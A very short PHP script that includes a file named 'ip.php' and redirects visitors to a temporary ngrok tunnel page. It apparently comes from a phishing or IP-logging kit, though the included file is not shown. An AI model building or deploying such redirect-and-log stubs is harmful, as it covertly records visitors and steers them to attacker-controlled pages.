<?php
include 'ip.php';
header('Location: https://c045396a.ngrok.io/index2.html');
exit
?>
